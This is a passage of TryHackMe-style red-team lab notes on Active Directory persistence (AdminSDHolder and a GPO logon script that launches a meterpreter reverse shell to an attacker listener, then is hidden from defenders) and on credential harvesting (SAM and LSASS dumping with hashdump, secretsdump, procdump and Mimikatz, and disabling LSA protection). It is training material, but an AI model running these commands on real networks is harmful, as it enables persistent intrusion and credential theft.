 credentials, use the runas command to inject the Administrator 
credentials, and then execute MMC from this new terminal:

`runas /netonly /user:thmchilddc.tryhackme.loc\Administrator cmd.exe`

Once you have an MMC window, add the Users and Groups Snap-in (File->Add Snap-In->Active Directory Users and Computers). **Make sure to enable Advanced Features (View->Advanced Features). We can find the AdminSDHolder group under Domain->System:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/0f6439b2dd402b9ec019f3cef177526f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/0f6439b2dd402b9ec019f3cef177526f.png)

Navigate to the Security of the group (Right-click->Properties->Security):

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/7ebe36369729b7edb1160dde2ace276a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/7ebe36369729b7edb1160dde2ace276a.png)

Let's add our low-privileged user and grant Full Control:

1. Click **Add**.
2. Search for your low-privileged username and click **Check Names**.
3. Click **OK**.
4. Click **Allow** on **Full Control**.
5. Click **Apply**.
6. Click **OK**.

It should look something like this:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/75c8454bf447398db713da5fbae160dc.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/75c8454bf447398db713da5fbae160dc.png)

# SDProp

Now
 we just need to wait 60 minutes, and our user will have full control 
over all Protected Groups. This is because the Security Descriptor 
Propagator (SDProp) service executes automatically every 60 minutes and 
will propagate this change to all Protected Groups. However, since we do
 not like to wait, let's kick off the process manually using Powershell.
 In the `C:\Tools\` directory, a script `Invoke-ADSDPropagation` is provided::

Terminal

```markup
PS C:\Tools> Import-Module .\Invoke-ADSDPropagation.ps1
PS C:\Tools> Invoke-ADSDPropagation
```

Once
 done, give it a minute and then review the security permissions of a 
Protected Group such as the Domain Admins group (you can use the search 
command to find this group):

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/5a2c03dd079b07a9fad3d9933547029d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/5a2c03dd079b07a9fad3d9933547029d.png)

As
 can be seen, our low privilege user has full control over the group. 
You can verify that this will continue to propagate by removing your 
user from the security permissions and rerunning the PowerShell
 script. Your user will be added again. Interestingly, although we have 
permissions to modify the group, it does not automatically add us to the
 group:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/0c843b5caaa4c2ea33700af7fd30a14b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/0c843b5caaa4c2ea33700af7fd30a14b.png)

However, using our new permissions, we can add ourselves to this group:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/0d8bf9bba31cbf0cf8a45a5a0b5f67fa.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/0d8bf9bba31cbf0cf8a45a5a0b5f67fa.png)

# It Is Going Downhill For The

Imagine
 combining this with the nesting groups of the previous task. Just as 
the blue team finished revoking your access through numerous group 
changes, 60 minutes later, you can just do it all again. Unless the blue
 team understands that the permissions are being altered through the 
AdminSDHolder group, they would be scratching their heads every 60 
minutes. Since the persistence propagates through a legitimate AD
 service, they would most likely be none the wiser every time it 
happens. If you really want to persist, you can grant full control to 
the Domain Users group in the AdminSDHolder group, which means any 
low-privileged user would be granted full control over all Protected 
Groups. Combining this with a full DC Sync means the blue team will have
 to reset every single credential in the domain to flush us out 
completely.

**Persistence through GPOs**

The last persistence 
technique we will review is persistence through Group Policy Objects 
(GPOs). At this point, you should be familiar with GPOs based on all the
 different enumeration, attack, and exploitation techniques we have 
discussed. However, GPOs are also excellent for deploying persistence.

Group Policy Management in AD
 provides a central mechanism to manage the local policy configuration 
of all domain-joined machines. This includes configuration such as 
membership to restricted groups, firewall and AV configuration, and 
which scripts should be executed upon startup. While this is an 
excellent tool for management, it can be targeted by attackers to deploy
 persistence across the entire estate. What is even worse is that the 
attacker can often hide the GPO in such a way that it becomes almost 
impossible to remove it.

# Domain Wide

The following are some common GPO persistence techniques:

- Restricted Group Membership - This could allow us administrative access to all hosts in the domain
- Logon Script Deployment - This will ensure that we get a shell callback every time a user authenticates to a host in the domain.

There
 are many different hooks that can be deployed. You can play around with
 GPOs to learn about other hooks. Since we already used the first hook, 
Restricted Group Membership, in the Exploiting AD
 room. Let's now focus on the second hook. While having access to all 
hosts are nice, it can be even better by ensuring we get access to them 
when administrators are actively working on them. To do this, we will 
create a GPO that is linked to the Admins OU, which will allow us to get
 a shell on a host every time one of them authenticates to a host.

# Preparation

Before we can create the GPO.
 We first need to create our shell, listener, and the actual bat file 
that will execute our shell. Let's start by generating a basic 
executable shell that we can use:

`msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=persistad lport=4445 -f exe > <username>_shell.exe`

Make
 sure to add your username to the binary name to avoid overwriting the 
shells of other users. Windows allows us to execute Batch or PowerShell
 scripts through the logon GPO. Batch scripts are often more stable than
 PowerShell scripts so lets create one that will copy our executable to 
the host and execute it once a user authenticates. Create the following 
script called `<username>_script.bat` on the AttackBox:

`copy
 
\\za.tryhackme.loc\sysvol\za.tryhackme.loc\scripts\<username>_shell.exe
 C:\tmp\<username>_shell.exe && timeout /t 20 && 
C:\tmp\<username>_shell.exe`

You will see that the script executes three commands chained together with `&&`.
 The script will copy the binary from the SYSVOL directory to the local 
machine, then wait 20 seconds, before finally executing the binary.

We can use SCP and our Administrator credentials to copy both scripts to the SYSVOL directory:

Terminal

```markup
$thm scp am0_shell.exe za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/

$thm scp am0_script.bat za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
```

Finally, let's start our MSF listener:

`msfconsole -q -x "use exploit/multi/handler; set payload 
windows/x64/meterpreter/reverse_tcp; set LHOST persistad; set LPORT 
4445;exploit"`

With our prep now complete, we can finally create the GPO that will execute it. You will need to RDP into THMWRK1 and use a runas window running as the Administrator for the next steps.

# GPO

The first step uses our Domain Admin account to open the Group Policy Management snap-in:

1. In your runas-spawned terminal, type MMC and press enter.
2. Click on **File**>**Add/Remove Snap-in...**
3. Select the **Group Policy Management** snap-in and click **Add**
4. Click **OK**

You should be able to see the GPO manager:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/62aab3368a951e8180c35bef9ed82ead.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/62aab3368a951e8180c35bef9ed82ead.png)

While we can technically write our contents to the Default Domain Policy, which should propagate to all AD
 objects, we will take a more narrow approach for the task just to show 
the process. You can play around afterwards to apply the changes to the 
entire domain.

We will write a GPO
 that will be applied to all Admins, so right-click on the Admins OU and
 select Create a GPO in this domain, and Link it here. Give your GPO a 
name such as `username - persisting GPO`:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/e71058947046aa9b8e77dff06292d15b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/e71058947046aa9b8e77dff06292d15b.png)

Right-click
 on your policy and select Enforced. This will ensure that your policy 
will apply, even if there is a conflicting policy. This can help to 
ensure our GPO
 takes precedence, even if the blue team has written a policy that will 
remove our changes. Now you can right-click on your policy and select 
edit:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/99a7c82a27440ca59365581c3191ce24.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/99a7c82a27440ca59365581c3191ce24.png)

Let's get back to our Group Policy Management Editor:

1. Under User Configuration, expand **Policies->Windows Settings**.
2. Select **Scripts (Logon/Logoff)**.
3. Right-click on **Logon->Properties**
4. Select the **Scripts** tab.
5. Click **Add->Browse**.

Let's navigate to where we stored our Batch and binary files:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c74b252805561488167c1a7c5d02dcce.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c74b252805561488167c1a7c5d02dcce.png)

Select your Batch file as the script and click **Open** and **OK**. Click **Apply** and **OK**.
 This will now ensure that every time one of the administrators (tier 2,
 1, and 0) logs into any machine, we will get a callback.

In
 order to simulate this, let's reset the password for one of the Tier 1 
administrator accounts and authenticate to a server. Use any of the 
techniques you've learned in the previous AD
 rooms to either reset the password of one of the Tier 1 administrators.
 Once done, remember to start your MSF multi-handler, and let's test it 
out by RDPing into THMSERVER1 or THMSERVER2!

Use your Tier 1 administrator credentials, RDP into one of the servers. If you give it another minute, you should get a callback on your multi-handler:

Terminal

```markup
msf5 exploit(multi/handler) > run
Started reverse TCP handler on 172.31.16.251:4445

[*] Sending stage (176195 bytes) to 172.31.1.201
[*] Meterpreter session 1 opened (172.31.16.251:4445 -> 172.31.1.201:63695) at 2022-05-07 10:06:28 +0100

meterpreter >
```

Note: You need to create a Logon event for the GPO
 to execute. If you just closed your RDP session, that only performs a 
disconnect which means it would not trigger the GPO. Make sure to select
 navigate to sign out as shown below in order to terminate the session. 
This will ensure that a Logon event is generated when you 
reauthenticate:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/7e98b74b5dd21316a351384085eb2b5d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/7e98b74b5dd21316a351384085eb2b5d.png)

# Hiding in Plain Sight

Now
 that we know that our persistence is working, it is time to make sure 
the blue team can't simply remove our persistence. Go back to your MMC 
windows, click on your policy and then click on Delegation:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/744c4e6a1dd0a5aef63680cc7cf53120.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/744c4e6a1dd0a5aef63680cc7cf53120.png)

By default, all administrators have the ability to edit GPOs. Let's remove these permissions:

1. **Right-Click** on **ENTERPRISE DOMAIN CONTROLLERS** and select **Edit settings, delete, modify security**.
2. **Click** on all other groups (except Authenticated Users) and click **Remove**.

You should be left with delegation that looks like this:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/79f5e69b102214a73b605ed86e67aa7d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/79f5e69b102214a73b605ed86e67aa7d.png)

Click on Advanced and remove the Created Owner from the permissions:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/cb338537225085db379e8f5fecf82684.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/cb338537225085db379e8f5fecf82684.png)

By
 default, all authenticated Users must have the ability to read the 
policy. This is required because otherwise, the policy could not be read
 by the user's account when they authenticate to apply User policies. If
 we did not have our logon script, we could also remove this permission 
to make sure that almost no one would be able to read our Policy.

We
 could replace Authenticated Users with Domain Computers to ensure that 
computers can still read and apply the policy, but prevent any user from
 reading the policy. Let's do this to test, but remember this can result
 in you not getting a shell callback upon authentication since the user 
will not be able to read the PowerShell script, so make sure to test your shell before performing these steps. **There is no going back after this:**

1. Click **Add**.
2. Type **Domain Computers**, click **Check Names** and then **OK**.
3. Select **Read permissions** and click **OK**.
4. Click on **Authenticated Users** and click **Remove**.

Right after you perform these steps, you will get an error that you can no longer read your own policy:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/603cb51d1486fcafe3114a19e6bc4e2e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/603cb51d1486fcafe3114a19e6bc4e2e.png)

You can also see on the sidebar that we can no longer read this policy:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c960f0e9443e92abe52a4993e7ad1287.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c960f0e9443e92abe52a4993e7ad1287.png)

By
 performing these steps, we can ensure that even with the highest level 
of permissions, the blue team would not be able to remove our GPO
 unless they impersonated the machine account of a Domain Controller. 
This makes it extra hard to firstly discover, and even if they discover 
the GPO, it would be incredibly hard to remove. We don't even have the 
required permissions to interface with our policy anymore, so one will 
have to stay there until a network reset is performed. You can verify 
that the GPO is still applied by RDPing into one of the THMSERVERS.

**CREDENTIAL HARVESTING**

**Credential Access**

# Credential Access

Credential
 access is where adversaries may find credentials in compromised systems
 and gain access to user credentials. It helps adversaries to reuse them
 or impersonate the identity of a user. This is an important step for 
lateral movement and accessing other resources such as other 
applications or systems. Obtaining legitimate user credentials is 
preferred rather than exploiting systems using CVEs.

For more information, you may visit the MITRE ATT&CK framework ([TA0006](https://attack.mitre.org/tactics/TA0006/)).

Credentials are stored insecurely in various locations in systems:

- Clear-text files
- Database files
- Memory
- Password managers
- Enterprise Vaults
- Active Directory
- Network Sniffing

Let's discuss them a bit more!

# Clear-text files

Attackers
 may search a compromised machine for credentials in local or remote 
file systems. Clear-text files could include sensitive information 
created by a user, containing passwords, private keys, etc. The MITRE ATT&CK framework defines it as **Unsecured Credentials: Credentials In Files** ([T1552.001](https://attack.mitre.org/techniques/T1552/001/)).

The following are some of the types of clear-text files that an attacker may be interested in:

- Commands history
- Configuration files (Web App, FTP files, etc.)
- Other Files related to Windows Applications (Internet Browsers, Email Clients, etc.)
- Backup files
- Shared files and folders
- Registry
- Source code

# 

As an example of a history command, a PowerShell saves executed PowerShell commands in a history file in a user profile in the following path: `C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

It
 might be worth checking what users are working on or finding sensitive 
information. Another example would be finding interesting information. 
For example, the following command is to look for the "password" keyword
 in the Window registry.

Searching for the "password" keyword in the Registry

```
c:\Users\user> reg query HKLM /f password /t REG_SZ /s
#ORC:\Users\user> reg query HKCU /f password /t REG_SZ /s
```

# Database Files

Applications
 utilize database files to read or write settings, configurations, or 
credentials. Database files are usually stored locally in Windows 
operating systems. These files are an excellent target to check and hunt for credentials. For more information, we suggest checking THM room: [Breaching AD](https://tryhackme.com/room/breachingad). It contains a showcase example of extracting credentials from the local McAfee Endpoint database file.

# Password Managers

A
 password manager is an application to store and manage users' login 
information for local and Internet websites and services. Since it deals
 with users' data, it must be stored securely to prevent unauthorized 
access.

Examples of Password Manager applications:

# Built-in password managers (Windows)

# Third-party: KeePass, 1Password, LastPass

However,
 misconfiguration and security flaws are found in these applications 
that let adversaries access stored data. Various tools could be used 
during the enumeration stage to get sensitive data in password manager 
applications used by Internet browsers and desktop applications.

This room will discuss how to access the Windows Credentials manager and extract passwords.

# Memory Dump

The Operating system's memory is a rich source of sensitive information that belongs to the Windows OS,
 users, and other applications. Data gets loaded into memory at run time
 or during the execution. Thus, accessing memory is limited to 
administrator users who fully control the system.

The following are examples of memory stored sensitive data, including:

- Clear-text credentials
- Cached passwords
- AD Tickets

In this room, we will discuss how to get access to memory and extract clear-text passwords and authentication tickets.

# Active Directory

Active
 Directory stores a lot of information related to users, groups, 
computers, etc. Thus, enumerating the Active Directory environment is 
one of the focuses of red team assessments. Active Directory has a solid
 design, but misconfiguration made by admins makes it vulnerable to 
various attacks shown in this room.

The following are some of the Active Directory misconfigurations that may leak users' credentials.

- **Users' description**: Administrators set a password in the description for new employees and
leave it there, which makes the account vulnerable to unauthorized
access.
- **Group Policy SYSVOL**: Leaked encryption keys let
attackers access administrator accounts. Check Task 8 for more
information about the vulnerable version of SYSVOL.
- **NTDS:** Contains AD users' credentials, making it a target for attackers.
- **AD Attacks:** Misconfiguration makes AD vulnerable to various attacks, which we will discuss in Task 9.

# Network Sniffing

Gaining
 initial access to a target network enables attackers to perform various
 network attacks against local computers, including the AD
 environment. The Man-In-the-Middle attack against network protocols 
lets the attacker create a rogue or spoof trusted resources within the 
network to steal authentication information such as NTLM hashes.

**Local Windows Credentials**

In
 general, Windows operating system provides two types of user accounts: 
Local and Domain. Local users' details are stored locally within the 
Windows file system, while domain users' details are stored in the 
centralized Active Directory. This task discusses credentials for local 
user accounts and demonstrates how they can be obtained.

# Keystrokes

Keylogger
 is a software or hardware device to monitor and log keyboard typing 
activities. Keyloggers were initially designed for legitimate purposes 
such as feedback for software development or parental control. However, 
they can be misused to steal data. As a red teamer, hunting for 
credentials through keyloggers in a busy and interactive environment is a
 good option. If we know a compromised target has a logged-in user, we 
can perform keylogging using tools like the Metasploit framework or 
others.

We have a use case example for exploiting users via keystrokes using Metasploit in another THM room. For more information, you should check THM [Exploiting AD](https://tryhackme.com/room/exploitingad) (Task 5).

# Security Account Manager (SAM)

The
 SAM is a Microsoft Windows database that contains local account 
information such as usernames and passwords. The SAM database stores 
these details in an encrypted format to make them harder to be 
retrieved. Moreover, it can not be read and accessed by any users while 
the Windows operating system is running. However, there are various ways and attacks to dump the content of the SAM database.

First, ensure you have deployed the provided VM and then confirm we are not able to copy or read  the `c:\Windows\System32\config\sam` file:

Confirming No Access to the SAM Database

```
C:\Windows\system32>type c:\Windows\System32\config\sam
type c:\Windows\System32\config\sam
The process cannot access the file because it is being used by another process.

C:\Windows\System32> copy c:\Windows\System32\config\sam C:\Users\Administrator\Desktop\
copy c:\Windows\System32\config\sam C:\Users\Administrator\Desktop\
The process cannot access the file because it is being used by another process.
        0 file(s) copied.
```

# Metasploit's HashDump

The first method is using the built-in Metasploit
 Framework feature, hashdump, to get a copy of the content of the SAM 
database. The Metasploit framework uses in-memory code injection to the 
LSASS.exe process to dump copy hashes. For more information about 
hashdump, you can visit the [rapid7](https://www.rapid7.com/blog/post/2010/01/01/safe-reliable-hash-dumping/) blog. We will discuss dumping credentials directly from the LSASS.exe process in another task!

Dumping the SAM database content

```
meterpreter > getuid
Server username: THM\Administrator
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:98d3b784d80d18385cea5ab3aa2a4261:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ec44ddf5ae100b898e9edab74811430d:::
CREDS-HARVESTIN$:1008:aad3b435b51404eeaad3b435b51404ee:443e64439a4b7fe780db47fc06a3342d:::
```

# Volume Shadow Copy Service

The
 other approach uses the Microsoft Volume shadow copy service, which 
helps perform a volume backup while applications read/write on volumes. 
You can visit the [Microsoft documentation page](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) for more information about the service.

More specifically, we will be using wmic to create a shadow volume copy. This has to be done through the command prompt with **administrator privileges** as follows,

1. Run the standard cmd.exe prompt with administrator privileges.
2. Execute the wmic command to create a copy shadow of C: drive
3. Verify the creation from step 2 is available.
4. Copy the SAM database from the volume we created in step 2

Now
 let's apply what we discussed above and run the cmd.exe with 
administrator privileges. Then execute the following wmic command:

Creating a Shadow Copy of Volume C with WMIC

```
C:\Users\Administrator>wmic shadowcopy call create Volume='C:\'
Executing (Win32_ShadowCopy)->create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ReturnValue = 0;
        ShadowID = "{D8A11619-474F-40AE-A5A0-C2FAA1D78B85}";
};
```

Once the command is successfully executed, let's use the `vssadmin`, Volume Shadow Copy Service administrative command-line tool, to list and confirm that we have a shadow copy of the `C:` volume.

Listing the Available Shadow Volumes

```
C:\Users\Administrator>vssadmin list shadows
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Contents of shadow copy set ID: {0c404084-8ace-4cb8-a7ed-7d7ec659bb5f}
   Contained 1 shadow copies at creation time: 5/31/2022 1:45:05 PM
      Shadow Copy ID: {d8a11619-474f-40ae-a5a0-c2faa1d78b85}
         Original Volume: (C:)\\?\Volume{19127295-0000-0000-0000-100000000000}\
         Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
         Originating Machine: Creds-Harvesting-AD.thm.red
         Service Machine: Creds-Harvesting-AD.thm.red
         Provider: 'Microsoft Software Shadow Copy provider 1.0'
         Type: ClientAccessible
         Attributes: Persistent, Client-accessible, No auto release, No writers, Differential

```

The output shows that we have successfully created a shadow copy volume of (C:) with the following path: `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1`.

As mentioned previously, the SAM database is encrypted either with [RC4](https://en.wikipedia.org/wiki/RC4) or [AES](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard) encryption algorithms. In order to decrypt it, we need a decryption key which is also stored in the files system in `c:\Windows\System32\Config\system`.

Now let's copy both files (sam and system) from the shadow copy volume we generated to the desktop as follows,

Copying the SAM and SYSTEM file from the Shadow Volume

```
C:\Users\Administrator>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
        1 file(s) copied.

C:\Users\Administrator>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
        1 file(s) copied.
```

Now we have both required files, transfer them to the AttackBox with your favourite method (SCP should work).

# Registry Hives

Another
 possible method for dumping the SAM database content is through the 
Windows Registry. Windows registry also stores a copy of some of the SAM
 database contents to be used by Windows services. Luckily, we can save 
the value of the Windows registry using the reg.exe tool. As previously 
mentioned, we need two files to decrypt the SAM database's content. 
Ensure you run the command prompt with Administrator privileges.

Save SAM and SYSTEM files from the registry

```
C:\Users\Administrator\Desktop>reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
The operation completed successfully.

C:\Users\Administrator\Desktop>reg save HKLM\system C:\users\Administrator\Desktop\system-reg
The operation completed successfully.

C:\Users\Administrator\Desktop>
```

Let's this time decrypt it using one of the Impacket tools:

```
secretsdump.py
```

,
 which is already installed in the AttackBox. The Impacket SecretsDump 
script extracts credentials from a system locally and remotely using 
different techniques.

Move both SAM and system files to the AttackBox and run the following command:

Decrypting SAM Database using Impacket SecretsDump Script Locally

```
user@machine:~# python3.9 /opt/impacket/examples/secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCALImpacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:98d3a787a80d08385cea7fb4aa2a4261:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up...
```

Note that we used the SAM and System files that we extracted from Windows Registry. The `-sam` argument is to specify the path for the dumped sam file from the Windows machine. The `-system` argument is for a path for the system file. We used the `LOCAL` argument at the end of the command to decrypt the Local SAM file as this tool handles other types of decryption.

Note if we compare the output against the NTLM
 hashes we got from Metasploit's Hashdump, the result is different. The 
reason is the other accounts belong to Active Directory, and their 
information is **not** stored in the System file we have 
dumped. To Decrypt them, we need to dump the SECURITY file from the 
Windows file, which contains the required files to decrypt Active 
Directory accounts.

Once we obtain NTLM
 hashes, we can try to crack them using Hashcat if they are guessable, 
or we can use different techniques to impersonate users using the 
hashes.

**Local Security Authority Subsystem Service (LSASS)**.

# What is the LSASS?

Local Security Authority Server Service (LSASS) is a Windows 
process that handles the operating system security policy and enforces 
it on a system. It verifies logged in accounts and ensures passwords, 
hashes, and Kerberos tickets. Windows system stores credentials in the LSASS process to enable users to access network resources, such as file shares, SharePoint sites, and other network services, without entering credentials every time a user connects.

Thus,
 the LSASS process is a juicy target for red teamers because it stores 
sensitive information about user accounts. The LSASS is commonly abused 
to dump credentials to either escalate privileges, steal data, or move 
laterally. Luckily for us, if we have administrator privileges, we can 
dump the process memory of LSASS. Windows system allows us to create a 
dump file, a snapshot of a given process. This could be done either with
 the Desktop access (GUI) or the command prompt. This attack is defined in the MITRE ATT&CK framework as "[OS Credential Dumping: LSASS Memory (T1003)](https://attack.mitre.org/techniques/T1003/001/)".

# Graphic User Interface ()

To dump any running Windows process using the GUI, open the Task Manager, and from the Details tab, find the required process, right-click on it, and select "Create dump file".

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/1af2123f694b7386364b53ae6259b8de.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/1af2123f694b7386364b53ae6259b8de.png)

Once
 the dumping process is finished, a pop-up message will show containing 
the path of the dumped file. Now copy the file and transfer it to the 
AttackBox to extract NTLM hashes offline.

**Note:** if we try this on the provided VM, you should get an error the first time this is run, until we fix the registry value in the **Protected LSASS** section later in this task.

Copy the dumped process to the Mimikatz folder.

Copying the LSASS Dumped file

```markup
C:\Users\Administrator>copy C:\Users\ADMINI~1\AppData\Local\Temp\2\lsass.DMP C:\Tools\Mimikatz\lsass.DMP
        1 file(s) copied.
```

# Sysinternals Suite

An alternative way to dump a process if a GUI
 is not available to us is by using ProcDump. ProcDump is a Sysinternals
 process dump utility that runs from the command prompt. The 
SysInternals Suite is already installed in the provided machine at the 
following path: `c:\Tools\SysinternalsSuite`

We can specify a running process, which in our case is lsass.exe, to be dumped as follows,

Dumping the LSASS Process using procdump.exe

```markup
c:\>c:\Tools\SysinternalsSuite\procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump

ProcDump v10.0 - Sysinternals process dump utility
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[09:09:33] Dump 1 initiated: c:\Tools\Mimikatz\lsass_dump-1.dmp
[09:09:33] Dump 1 writing: Estimated dump file size is 162 MB.
[09:09:34] Dump 1 complete: 163 MB written in 0.4 seconds
[09:09:34] Dump count reached.
```

Note that the dump process is writing to disk. Dumping the LSASS process is a known technique used by adversaries. Thus, AV
 products may flag it as malicious. In the real world, you may be more 
creative and write code to encrypt or implement a method to bypass AV 
products.

# MimiKatz

[Mimikatz](https://github.com/gentilkiwi/mimikatz) is a well-known tool used for extracting passwords, hashes, PINs, and Kerberos tickets from memory using various techniques. Mimikatz is a post-exploitation tool that enables other useful attacks, such as pass-the-hash, pass-the-ticket, or building Golden Kerberos tickets. Mimikatz deals with operating system memory to access information. Thus, it requires administrator and system privileges in order to dump memory and extract credentials.

We will be using the `Mimikatz` tool
 to extract the memory dump of the lsass.exe process. We have provided 
the necessary tools for you, and they can be found at: `c:\Tools\Mimikatz`.

Remember
 that the LSASS process is running as a SYSTEM. Thus in order to access 
users' hashes, we need a system or local administrator permissions. 
Thus, open the command prompt and run it as administrator. Then, execute
 the mimikatz binary as follows,

Runing mimikatz With Admin Privielges

```markup
C:\Tools\Mimikatz> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Jul 10 2019 23:09:43
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz #
```

Before dumping the memory for cashed credentials and hashes, we need to enable the SeDebugPrivilege and check the current permissions for memory access. It can be done by executing `privilege::debug` command as follows,

Checking the Current Permission to Access Memory

```markup
mimikatz # privilege::debug
Privilege '20' OK
```

Once the privileges are given, we can access the memory to dump all cached passwords and hashes from the `lsass.exe` process using `sekurlsa::logonpasswords`. If we try this on the provided VM, it will not work until we fix it in the next section.

Dumping the Stored Clear-text Passwords

```markup
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 515377 (00000000:0007dd31)
Session           : RemoteInteractive from 3
User Name         : Administrator
Domain            : THM
Logon Server      : CREDS-HARVESTIN
Logon Time        : 6/3/2022 8:30:44 AM
SID               : S-1-5-21-1966530601-3185510712-10604624-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : THM
         * NTLM     : 98d3a787a80d08385cea7fb4aa2a4261
         * SHA1     : 64a137cb8178b7700e6cffa387f4240043192e72
         * DPAPI    : bc355c6ce366fdd4fd91b54260f9cf70
...
```

Mimikatz lists a lot of information about accounts and 
machines. If we check closely in the Primary section for Administrator 
users, we can see that we have an NTLM hash.

**Note** to get users' hashes, a user (victim) must have logged in to a system, and the user's credentials have been cached.

# Protected LSASS

In
 2012, Microsoft implemented an LSA protection, to keep LSASS from being
 accessed to extract credentials from memory. This task will show how to
 disable the LSA protection and dump credentials from memory using 
Mimikatz. To enable LSASS protection, we can modify the registry 
RunAsPPL DWORD value in `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa` to 1.

The
 steps are similar to the previous section, which runs the Mimikatz 
execution file with admin privileges and enables the debug mode. If the 
LSA protection is enabled, we will get an error executing the 
"sekurlsa::logonpasswords" command.

Failing to Dump Stored Password Due to the LSA Protection

```markup
mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
```

The command returns a 0x00000005 error code message (Access Denied). Lucky
 for us, Mimikatz provides a mimidrv.sys driver that works on kernel 
level to disable the LSA protection. We can import it to Mimikatz by 
executing "!+" as follows,

Loading the mimidrv Driver into Memory

```markup
mimikatz # !+
